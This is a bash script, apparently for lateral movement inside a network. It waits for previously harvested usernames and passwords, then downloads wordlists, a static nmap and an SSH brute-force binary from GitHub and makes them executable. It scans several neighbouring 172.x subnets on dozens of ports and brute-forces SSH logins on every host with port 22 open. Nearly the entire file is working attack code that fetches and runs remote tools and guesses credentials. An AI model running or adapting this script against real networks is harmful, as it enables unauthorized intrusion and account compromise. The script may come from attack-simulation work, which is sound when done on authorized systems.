#!/bin/bash
LOGFILE="/tmp/scan.log"
# Function to convert IP address to decimal
ip_to_dec() {
    local IFS=.
    read ip1 ip2 ip3 ip4 <<< "$1"
    echo "$((ip1 * 16777216 + ip2 * 65536 + ip3 * 256 + ip4))"
}

# Function to convert decimal to IP address
dec_to_ip() {
    local ip dec=$1
    for e in {3..0}; do
        ((octet = dec / (256 ** e) ))
        ((dec -= octet * 256 ** e))
        ip+="$${octet}."
    done
    echo "$${ip%?}"
}

# Main function to generate IP list from CIDR
generate_ips() {
    local cidr="$1"
    local ip="$${cidr%/*}"
    local prefix="$${cidr#*/}"
    local netmask=$((0xffffffff ^ ((1 << (32 - prefix)) - 1)))

    local start=$(ip_to_dec "$ip")
    local start=$((start & netmask))
    local end=$((start | ((1 << (32 - prefix)) - 1)))

    for ((ip= start; ip <= end; ip++)); do
        dec_to_ip "$ip"
    done
}

while ! [ -f "/tmp/found-users.txt" ] || ! [ -f "/tmp/found-passwords.txt" ]; do
    echo "waiting for /tmp/found-users.txt and /tmp/found-passwords.txt..."
    sleep 30
done

# keep first found password and append top short passwords lists
HEAD=$(head -1 /tmp/found-passwords.txt)
curl -LJ https://github.com/danielmiessler/SecLists/raw/master/Passwords/darkweb2017-top100.txt > /tmp/bruteforce-passwords.txt
echo $HEAD >> /tmp/bruteforce-passwords.txt

# keep first found user and append top short users lists
HEAD=$(head -1 /tmp/found-users.txt)
curl -LJ https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt > /tmp/bruteforce-users.txt
echo $HEAD >> /tmp/bruteforce-users.txt

# download brute force tool
curl -LJ https://github.com/credibleforce/sshgobrute/releases/download/v0.0.1/sshgobrute -o /tmp/sshgobrute && chmod 755 /tmp/sshgobrute

# scan local network to find open ssh ports
LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
LOCAL_IP=$(echo -n $LOCAL_NET | awk -F "/" '{ print $1 }')
base_octet=$(echo "$LOCAL_NET" | cut -d. -f2)

# Define the range to scan above and below the current network
range=3
start=$((base_octet - range))
end=$((base_octet + range))

# Iterate through each network, changing the second octet
truncate -s0 /tmp/hydra-targets.txt /tmp/nmap-targets.txt
for (( i=$start; i<=$end; i++ )); do
        network="172.$i.0.0/24"
        echo "Adding network: $network"
        generate_ips $network >> /tmp/hydra-targets.txt
        echo $network >> /tmp/nmap-targets.txt
done
curl -LJ https://github.com/kellyjonbrazil/jc/releases/download/v1.25.0/jc-1.25.0-linux-x86_64.tar.gz -o jc.tgz
tar -zxvf jc.tgz && chmod 755 jc
curl -LJ -o jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 jq
curl -LJ https://github.com/credibleforce/static-binaries/raw/master/binaries/linux/x86_64/nmap -o /tmp/nmap && chmod 755 /tmp/nmap
truncate -s0 /tmp/scan.xml
/tmp/nmap -sT -p80,23,443,21,22,25,3389,110,445,139,143,53,135,3306,8080,1723,111,995,993,5900,1025,587,8888,199,1720,465,548,113,81,6001,10000,514,5060,179,1026,2000,8443,8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,990,5357,427,49156,543,544,5101,144,7,389 -oX /tmp/scan.xml -iL /tmp/nmap-targets.txt && cat /tmp/scan.xml | ./jc --xml -p | tee /tmp/scan.json
# find all ssh open ports
cat /tmp/scan.json | ./jq -r '.nmaprun.host[] | select(.ports.port."@portid"=="22" and .ports.port.state."@state"=="open") | .address | if type=="array" then first | select(."@addrtype" == "ipv4") | ."@addr" else select(."@addrtype" == "ipv4") | ."@addr" end' > /tmp/hydra-targets.txt
truncate -s0 /tmp/sshgobrute.txt
# exclude local ip
for target in $(cat /tmp/hydra-targets.txt | grep -v $LOCAL_IP); do
    for user in $(cat /tmp/bruteforce-users.txt); do
        echo "starting ssh brute force target: $user@$target" | tee -a /tmp/sshgobrute.txt
        /tmp/sshgobrute -ip $target -user $user -port 22 -file /tmp/bruteforce-passwords.txt | tee -a /tmp/sshgobrute.txt
    done
done